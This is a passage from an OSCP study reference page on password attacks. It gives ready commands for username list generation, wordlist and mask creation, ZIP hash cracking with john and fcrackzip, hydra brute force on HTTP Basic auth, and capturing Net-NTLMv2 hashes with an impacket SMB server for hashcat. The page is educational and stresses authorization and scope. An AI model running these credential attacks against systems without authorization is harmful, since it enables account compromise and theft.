+<p>Read: useful vocabulary is a candidate list, not a recovered password. An authenticated or JS-only page may expose little to the crawler. Use the already identified Hashcat/John format, then apply a small relevant rule/mask rather than immediately creating an enormous list.</p>
+<p>Sources: <a href="https://github.com/digininja/CeWL">upstream 1</a>.</p>
+<h2 id="generate-usernames-from-observed-naming-conventions">Generate usernames from observed naming conventions</h2>
+<p>Use when you have names and at least one real account/email that reveals a likely format. Put only relevant names in names.txt.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Review supported format names in this installed version
+./username-anarchy --list-formats
+
+# Restrict output to plausible formats rather than every permutation
+./username-anarchy -i names.txt -f first,first.last,flast,f.last > users.txt
+sort -u users.txt -o users.txt
+</code></pre>
+<p>Read: these are candidates. Confirm names with authorized directory/user enumeration; an email local part is not automatically a domain account. Keep domain, local-machine and application namespaces distinct. Use Kerbrute's username probe only when the KDC path and domain are known.</p>
+<p>Sources: <a href="https://github.com/urbanadventurer/username-anarchy">upstream 1</a>.</p>
+<h2 id="targeted-candidates--crunch-cupp-and-rules">Targeted candidates — Crunch, CUPP and rules</h2>
+<p>Use a mask/profile only when evidence justifies it. This example expands a known six-character stem with three digits; it creates 1,000 candidates.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">crunch 9 9 -t 'foobar%%%' -o stem-digits.txt
+
+# Interactive profile-based alternative, when relevant clues exist
+python3 cupp.py -i
+
+# Preview a rule expansion before choosing the recovery job
+hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule | head -n 40
+</code></pre>
+<p>Read: calculate candidate count and use the matching offline format. CUPP asks questions; invented personal details do not improve the list. A three-digit suffix or a rule is a hypothesis, not a reason to spray every generated value at an online login.</p>
+<p>Sources: <a href="https://www.kali.org/tools/crunch/">upstream 1</a> · <a href="https://github.com/Mebus/cupp">upstream 2</a> · <a href="https://hashcat.net/wiki/">upstream 3</a>.</p>
+<h2 id="password-protected-zip--direct-test-or-extracted-verifier">Password-protected ZIP — direct test or extracted verifier</h2>
+<p>Use when the artifact is an encrypted ZIP and its encryption is supported by the selected tool.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Dictionary attack; -u checks candidates by attempting extraction
+fcrackzip -u -D -p WORDLIST archive.zip
+
+# Alternative: extract a verifier for John, preserving the original archive
+zip2john archive.zip > archive.hash
+john --wordlist=WORDLIST archive.hash
+john --show archive.hash
+</code></pre>
+<p>Read: confirm a candidate by opening/extracting the intended file. An unsupported encryption type or empty verifier is a format/tool issue, not proof that the password is unguessable. Reuse the recovered value only after identifying its account/service context.</p>
+<p>Sources: <a href="https://www.kali.org/tools/fcrackzip/">upstream 1</a> · <a href="https://www.openwall.com/john/">upstream 2</a>.</p>
+<h2 id="http-basic-authentication--validate-the-challenge-and-failure-signal">HTTP Basic authentication — validate the challenge and failure signal</h2>
+<p>Use when the endpoint returns a real HTTP Basic challenge. A custom HTML login form is a different mechanism.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">curl -i http://TARGET:PORT/PROTECTED_PATH
+curl -i --basic -u USER http://TARGET:PORT/PROTECTED_PATH
+
+# Only when bounded online guessing is justified by scope and lockout controls
+hydra -l USER -P WORDLIST -s PORT -t 1 -f TARGET http-get /PROTECTED_PATH
+</code></pre>
+<p>Read: distinguish an accepted HTTP identity from permission to the protected function. Confirm a reported success with curl/browser. Redirects, uniform 200 pages or a mismatched realm/path make weak success detectors; fix the request before increasing guesses.</p>
+<p>Sources: <a href="https://github.com/vanhauser-thc/thc-hydra">upstream 1</a> · <a href="https://curl.se/docs/manpage.html">upstream 2</a>.</p>
+<h2 id="change-an-accounts-own-expiredknown-smb-password">Change an account’s own expired/known SMB password</h2>
+<p>Use when you know the old password and the account is allowed or required to change it. This is not an administrative reset of another account.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Prompts for the old and new password on the specified server/DC
+smbpasswd -r DC_HOST -U 'DOMAIN/USER'
+</code></pre>
+<p>Read: a successful change means subsequent password logins need the new value; existing ticket/session contexts do not automatically become new logons. Failure → check account scope, password policy, connectivity and change-password rights. Test the new password with the relevant native service client before moving on.</p>
+<p>Sources: <a href="https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html">upstream 1</a>.</p>
+<h2 id="generate-a-bounded-numeric-list-for-an-observed-identifier-pattern">Generate a bounded numeric list for an observed identifier pattern</h2>
+<p>Use when actual examples indicate a small numeric ID/range. Keep generated input separate from the decision to send online requests.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Unpadded IDs
+seq 0 999 > numbers.txt
+
+# Fixed-width values, only when the observed application uses that format
+seq -w 0 999 > numbers-padded.txt
+</code></pre>
+<p>Read: a matching format is a candidate input list, not permission to enumerate every object. Use the real session and compare owned/other/disallowed-object controls in the existing authorization workflow. Expand the range only when returned evidence justifies it.</p>
+<p>Sources: <a href="https://www.gnu.org/software/coreutils/manual/html_node/seq-invocation.html">upstream 1</a>.</p>
+<h2 id="an-application-authenticates-to-your-explicit-smb-endpoint">An application authenticates to your explicit SMB endpoint</h2>
+<p>Use only when an observed application/file-request primitive can contact an explicitly supplied SMB path and the network/account policy permits NTLM. This workflow does not poison names or spoof network identities.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Attacker: serve the intended directory and keep the authentication log
+mkdir -p share
+sudo impacket-smbserver SHARE ./share -smb2support 2>&#x26;1 | tee smb-server.log
+
+# A captured Net-NTLMv2 line is an offline-recovery artifact, not an NT hash
+hashcat -m 5600 netntlmv2.txt WORDLIST
+hashcat -m 5600 netntlmv2.txt --show
+</code></pre>
+<p>Supply the actual application with the intended <code>\\LHOST\SHARE\FILE</code> path only through the already verified input mechanism. Read: retain the entire challenge-response line and the reported account/domain. No callback can be routing, SMB egress or NTLM policy; a callback without recoverable credentials is not a password. Validate a recovered plaintext password in the matching identity. Do not substitute this response for the NT hash expected by pass-the-hash tools.</p>
+<p>Sources: <a href="https://github.com/fortra/impacket/blob/master/examples/smbserver.py">upstream 1</a> · <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">upstream 2</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://lizajose.github.io/getSH/password-cracking">getSH Password Cracking route</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li>Supplied PEN-200 Chapter 16, pp442-493</li>
+<li><a href="https://github.com/LeonardoE95/OSCP/blob/main/modules/windows/windows-privesc-cheatsheet.txt">Hexdump Windows hash and credential sections</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">Current OSCP+ Body of Knowledge</a></li>
+<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat example hashes</a></li>
+<li><a href="https://www.openwall.com/john/doc/">John the Ripper documentation</a></li>
+<li><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra official repository</a></li>
+<li><a href="https://www.netexec.wiki/getting-started/using-credentials">NetExec credential use</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket official repository</a></li>
+<li><a href="https://man.openbsd.org/ssh">OpenSSH manual</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">Current OSCP+ exam guide</a></li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
